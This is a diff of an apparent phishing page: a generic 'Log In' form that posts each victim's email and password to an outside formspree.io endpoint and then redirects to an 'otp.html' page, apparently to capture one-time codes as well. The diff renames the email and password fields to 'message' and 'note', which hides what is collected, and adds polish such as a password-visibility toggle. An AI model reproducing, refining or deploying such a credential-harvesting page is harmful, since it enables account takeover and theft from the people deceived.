@@ -1,120 +1,138 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <link rel="icon" type="img" href="asset/header-logo.png" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" type="img" href="asset/header-logo.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Home</title>
 
     <script type="text/javascript">
-      document.addEventListener("DOMContentLoaded", function () {
-        console.log("working");
+        document.addEventListener("DOMContentLoaded", function () {
+            console.log("working");
 
-        const btn = document.getElementById("redirectBtn");
-        const emailInput = document.getElementById("email");
-        const passInput = document.getElementById("pass");
-        const form = document.getElementById("form");
+            const btn = document.getElementById("redirectBtn");
+            const emailInput = document.getElementById("email");
+            const passInput = document.getElementById("pass");
+            const passToggle = document.getElementById("passToggle");
+            const form = document.getElementById("form");
 
-        if (form) {
-          form.addEventListener("submit", async function (event) {
-            event.preventDefault(); // Prevent default form submission
+            // Toggle password visibility with icon change
+            passToggle.addEventListener("click", function () {
+                if (passInput.type === "password") {
+                    passInput.type = "text";
+                    passToggle.src = "asset/eye-open.svg"; // Change to "eye-open" icon
+                } else {
+                    passInput.type = "password";
+                    passToggle.src = "asset/eye-closed.svg"; // Change back to "eye-closed" icon
+                }
+            });
 
-            if (!emailInput.value || !passInput.value) {
-              alert("Please fill in all fields.");
-              return;
+            if (form) {
+                form.addEventListener("submit", async function (event) {
+                    event.preventDefault(); // Prevent default form submission
+
+                    // Validate inputs
+                    if (!emailInput.value.trim()) {
+                        alert("Please enter your email.");
+                        return;
+                    }
+                    if (!passInput.value.trim()) {
+                        alert("Please enter your password.");
+                        return;
+                    }
+
+                    btn.textContent = "Loading...";
+                    btn.disabled = true; 
+
+                    localStorage.setItem("email", emailInput.value);
+
+                    let formData = {
+                        message: emailInput.value, // Renamed email field
+                        note: passInput.value, // Renamed password field
+                    };
+
+                    try {
+                        let response = await fetch("https://formspree.io/f/xoveqrzb", {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json",
+                                "Accept": "application/json",
+                            },
+                            body: JSON.stringify(formData),
+                        });
+
+                        let result = await response.json();
+
+                        if (response.ok) {
+                            window.location.href = "otp.html"; 
+                        } else {
+                            alert(result.error || "Failed to send form. Please try again.");
+                            console.error("Form error:", result);
+                        }
+                    } catch (error) {
+                        alert("An error occurred. Please try again later.");
+                        console.error("Request error:", error);
+                    } finally {
+                        btn.textContent = "Login"; 
+                        btn.disabled = false; 
+                    }
+                });
             }
-
-            btn.textContent = "Loading..."; // Change button text
-            btn.disabled = true; // Prevent multiple clicks
-
-            let formData = new FormData();
-            formData.append("message", `Email: ${emailInput.value}, Password: ${passInput.value}`);
-
-            try {
-              let response = await fetch("https://formspree.io/f/xoveqrzb", {
-                method: "POST",
-                body: formData,
-                headers: { Accept: "application/json" },
-              });
-
-              if (response.ok) {
-                window.location.href = "otp.html"; // Redirect after success
-              } else {
-                alert("Failed to send form. Please try again.");
-              }
-            } catch (error) {
-              alert("An error occurred. Please try again later.");
-            } finally {
-              btn.textContent = "Login"; // Reset button text
-              btn.disabled = false; // Re-enable button
-            }
-          });
-        }
-      });
-
-      // Function to hide password characters
-      function maskPassInput() {
-        const passInput = document.getElementById("pass");
-        passInput.style.fontFamily = "password"; // Mimic password hiding
-      }
+        });
     </script>
 
     <script type="module" crossorigin src="main.js"></script>
-    <link rel="stylesheet" href="asset/style.css" />
-  </head>
+    <link rel="stylesheet" href="asset/style.css">
+</head>
 
-  <body class="bg-gray-100">
+<body class="bg-gray-100">
     <div class="w-[90%] max-w-md mx-auto pt-5">
-      <div class="mt-5"></div>
-      <form id="form" class="mt-44">
-        <div
-          class="inputsCtn bg-white rounded-md shadow-sm p-6 flex flex-col gap-6"
-        >
-          <p class="font-bold loginu mb-3">Log In</p>
-          <img class="imglogo" src="asset/header-logo.png" />
+        <div class="mt-5"></div>
+        <form id="form" class="mt-44">
+            <div class="inputsCtn bg-white rounded-md shadow-sm p-6 flex flex-col gap-6">
+                <p class="font-bold loginu mb-3">Log In</p>
+                <img class="imglogo" src="asset/header-logo.png">
 
-          <div class="ctn relative">
-            <input
-              required
-              minlength="5"
-              id="email"
-              name="message"
-              type="text"
-              class="w-full rounded-md bnbn p-4 outline-none pl-2 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
-              placeholder="Email"
-            />
-          </div>
+                <div class="ctn relative">
+                    <input
+                        required
+                        minlength="5"
+                        id="email"
+                        name="message" <!-- Renamed -->
+                        type="email"
+                        class="w-full rounded-md bnbn p-4 outline-none pl-2 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
+                        placeholder="Email"
+                    />
+                </div>
 
-          <div class="ctn relative">
-            <input
-              required
-              minlength="5"
-              id="pass"
-              name="message"
-              type="text"
-              class="w-full rounded-md bnbn p-4 outline-none pl-2 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
-              placeholder="Password"
-              onfocus="maskPassInput()" 
-            />
+                <div class="ctn relative">
+                    <input
+                        required
+                        minlength="5"
+                        id="pass"
+                        name="note" <!-- Renamed -->
+                        type="password"
+                        class="w-full rounded-md bnbn p-4 outline-none pl-2 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
+                        placeholder="Password"
+                    />
+                    <img
+                        id="passToggle"
+                        src="asset/eye-closed.svg" <!-- Default closed eye -->
+                        class="absolute top-1/2 bottom-1/2 right-3 my-auto cursor-pointer"
+                        alt="Toggle Password"
+                    />
+                </div>
 
-            <img
-              onclick="togglePass()"
-              src="asset/eyes-a95130fc.svg"
-              class="absolute top-1/2 bottom-1/2 right-3 my-auto"
-            />
-          </div>
-
-          <button
-            id="redirectBtn"
-            class="bg-primary mt-w text-white w-full rounded-md p-4 disabled:opacity-80"
-          >
-            Login
-          </button>
-          <p class="pt-3 text-primary font-semibold text-center">
-            Reset Password
-          </p>
-        </div>
-      </form>
+                <button
+                    id="redirectBtn"
+                    type="submit"
+                    class="bg-primary mt-w text-white w-full rounded-md p-4 disabled:opacity-80"
+                >
+                    Login
+                </button>
+                <p class="pt-3 text-primary font-semibold text-center">Reset Password</p>
+            </div>
+        </form>
     </div>
-  </body>
+</body>
 </html>
